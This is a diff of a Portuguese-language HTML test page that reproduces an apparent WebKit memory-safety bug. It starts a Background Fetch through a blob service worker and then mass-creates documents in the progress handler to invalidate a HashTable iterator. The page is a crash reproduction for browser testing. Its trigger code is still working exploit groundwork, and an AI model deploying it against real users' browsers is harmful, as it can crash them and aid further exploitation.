@@ -3,10 +3,10 @@
 <head><meta charset="utf-8"></head>
 <body>
 <script>
-(function(){const logElement=document.createElement('pre');logElement.id='debug-log';logElement.style.cssText='position: fixed; bottom: 0; left: 0; width: 100%; max-height: 220px; overflow-y: auto; background: rgba(0, 0, 0, 0.85); color: #ff5555; font-family: monospace; font-size: 11px; z-index: 999999; padding: 8px; box-sizing: border-box; margin: 0; border-top: 2px solid #ff0000; text-align: left; white-space: pre-wrap; word-break: break-all;';if(document.body){document.body.appendChild(logElement);}else{document.addEventListener('DOMContentLoaded',()=>document.body.appendChild(logElement));}function log(msg,color='#ff5555'){if(!logElement)return;const line=document.createElement('div');line.style.color=color;line.textContent=msg;logElement.appendChild(line);logElement.scrollTop=logElement.scrollHeight;}window.onerror=function(message,source,lineno,colno,error){log(`[ERRO JS] ${message}\n  -> ${source}:${lineno}:${colno}`);};window.addEventListener('error',function(event){const target=event.target;if(target&&(target.tagName||target===window)){const tagName=target.tagName?target.tagName.toLowerCase():'recurso';const sourceUrl=target.src||target.href||'desconhecido';log(`[FALHA RECURSO/${tagName}] N�o foi poss�vel carregar: ${sourceUrl}`,'#ffaa00');}},true);window.addEventListener('unhandledrejection',function(event){log(`[PROMISE REJECTION] ${event.reason}`);});['log','error','warn','info'].forEach(method=>{const original=console[method];console[method]=function(...args){original.apply(console,args);const text=args.map(arg=>{if(typeof arg==='object'){try{return JSON.stringify(arg);}catch(e){return '[Objeto Circular]';}}return arg;}).join(' ');let color='#ffffff';if(method==='error')color='#ff5555';if(method==='warn')color='#ffaa00';log(`[Console.${method}] ${text}`,color);};});log('[Debug Ativo]','#00ff00');})();
+(function(){const logElement=document.createElement('pre');logElement.id='debug-log';logElement.style.cssText='position: fixed; bottom: 0; left: 0; width: 100%; max-height: 220px; overflow-y: auto; background: rgba(0, 0, 0, 0.85); color: #ff5555; font-family: monospace; font-size: 11px; z-index: 999999; padding: 8px; box-sizing: border-box; margin: 0; border-top: 2px solid #ff0000; text-align: left; white-space: pre-wrap; word-break: break-all;';if(document.body){document.body.appendChild(logElement);}else{document.addEventListener('DOMContentLoaded',()=>document.body.appendChild(logElement));}function log(msg,color='#ff5555'){if(!logElement)return;const line=document.createElement('div');line.style.color=color;line.textContent=msg;logElement.appendChild(line);logElement.scrollTop=logElement.scrollHeight;}window.onerror=function(message,source,lineno,colno,error){log(`[ERRO JS] ${message}\n  -> ${source}:${lineno}:${colno}`);};window.addEventListener('error',function(event){const target=event.target;if(target&&(target.tagName||target===window)){const tagName=target.tagName?target.tagName.toLowerCase():'recurso';const sourceUrl=target.src||target.href||'desconhecido';log(`[FALHA RECURSO/${tagName}] Não foi possível carregar: ${sourceUrl}`,'#ffaa00');}},true);window.addEventListener('unhandledrejection',function(event){log(`[PROMISE REJECTION] ${event.reason}`);});['log','error','warn','info'].forEach(method=>{const original=console[method];console[method]=function(...args){original.apply(console,args);const text=args.map(arg=>{if(typeof arg==='object'){try{return JSON.stringify(arg);}catch(e){return '[Objeto Circular]';}}return arg;}).join(' ');let color='#ffffff';if(method==='error')color='#ff5555';if(method==='warn')color='#ffaa00';log(`[Console.${method}] ${text}`,color);};});log('[Debug Ativo]','#00ff00');})();
 </script>
-<button id="start">Iniciar teste (requer HTTPS ou localhost)</button>
-<pre id="log"></pre>
+<button id="start">Iniciar teste</button>
+<pre id="log" style="background:#111;color:#eee;padding:8px;font:12px monospace;white-space:pre-wrap;"></pre>
 <script>
 const logEl = document.getElementById('log');
 function log(msg, color = '#fff') {
@@ -14,62 +14,91 @@ function log(msg, color = '#fff') {
   d.style.color = color;
   d.textContent = msg;
   logEl.appendChild(d);
+  logEl.scrollTop = logEl.scrollHeight;
 }
 
-// Service Worker m�nimo (equivalente ao change-documents-in-progress-event-sw.js do commit)
 const SW_SOURCE = `
 self.addEventListener('install', e => self.skipWaiting());
 self.addEventListener('activate', e => self.clients.claim());
 `;
 
 async function runTest() {
+  log('--- iniciando ---');
+
+  // 1) Service Worker
   if (!('serviceWorker' in navigator)) {
-    log('Service Worker indispon�vel � skip', '#f80');
+    log('❌ Service Worker indisponível — precisa de https:// ou http://localhost', '#f80');
     return;
   }
-  if (!('backgroundFetch' in (await navigator.serviceWorker.ready).registration || {})) {
-    log('Background Fetch API indispon�vel � skip', '#f80');
-    return;
-  }
+  log('✅ Service Worker API presente');
 
-  // Pre-populate allDocumentsMap so the matching Document is not the only entry.
-  let preDocs = [];
-  for (let i = 0; i < 8; i++)
-    preDocs.push(document.implementation.createHTMLDocument());
-
+  // 2) Registra o SW ANTES de checar backgroundFetch
   const swBlob = new Blob([SW_SOURCE], { type: 'application/javascript' });
   const swUrl = URL.createObjectURL(swBlob);
+  let swr;
+  try {
+    swr = await navigator.serviceWorker.register(swUrl, { scope: './' });
+    log('✅ Service Worker registrado');
+  } catch (e) {
+    log('❌ Falha ao registrar SW: ' + e.message, '#f55');
+    return;
+  }
 
-  const swr = await navigator.serviceWorker.register(swUrl, { scope: './' });
   await navigator.serviceWorker.ready;
+  log('✅ Service Worker pronto');
 
-  const request = await swr.backgroundFetch.fetch(
-    'repro-' + Date.now(),
-    ['/favicon.ico'] // qualquer recurso same-origin serv�vel
-  );
+  // 3) Background Fetch: fica em swr, NÃO em registration
+  if (typeof swr.backgroundFetch === 'undefined') {
+    log('❌ Background Fetch API indisponível neste navegador — skip', '#f80');
+    return;
+  }
+  log('✅ Background Fetch API presente');
 
-  let newDocs = [];
-  let fired = false;
+  // 4) Pre-populate allDocumentsMap
+  for (let i = 0; i < 8; i++)
+    document.implementation.createHTMLDocument();
+  log('✅ 8 documentos pré-criados');
 
-  let resolveCallback;
-  const promise = new Promise(resolve => resolveCallback = resolve);
+  // 5) Inicia o fetch
+  let request;
+  try {
+    request = await swr.backgroundFetch.fetch(
+      'repro-' + Date.now(),
+      [location.href] // mesma origem, sempre servível
+    );
+  } catch (e) {
+    log('❌ backgroundFetch.fetch falhou: ' + e.message, '#f55');
+    return;
+  }
+  log('✅ backgroundFetch iniciado: ' + request.id);
 
-  request.onprogress = () => {
-    if (fired) return;
-    fired = true;
-    log('progress disparado � criando 512 documentos para invalidar o iterador do HashTable�', '#0f0');
-    for (let i = 0; i < 512; i++)
-      newDocs.push(document.implementation.createHTMLDocument());
-    resolveCallback();
-  };
+  // 6) Dispara o progress
+  await new Promise((resolve) => {
+    let fired = false;
+    request.onprogress = () => {
+      if (fired) return;
+      fired = true;
+      log('⚡ progress disparado — criando 512 documentos (invalidação do iterator)…', '#0f0');
+      for (let i = 0; i < 512; i++)
+        document.implementation.createHTMLDocument();
+      resolve();
+    };
+    // fallback caso onprogress nunca dispare (ex.: fetch já completo)
+    setTimeout(() => {
+      if (!fired) {
+        log('⚠ onprogress não disparou em 5s — tentando mesmo assim', '#f80');
+        resolve();
+      }
+    }, 5000);
+  });
 
-  await promise;
-  log('PASS � nenhum crash (se o WebKit for corrigido) ou crash silencioso (se vulner�vel)', '#0f0');
+  log('✅ PASS — sem crash JS detectável', '#0f0');
 }
 
 document.getElementById('start').addEventListener('click', () => {
   logEl.innerHTML = '';
-  runTest().catch(e => log('ERRO: ' + e.message, '#f55'));
+  log('clicou', '#0f0');
+  runTest().catch(e => log('❌ ERRO NÃO TRATADO: ' + (e.stack || e.message), '#f55'));
 });
 </script>
 </body>
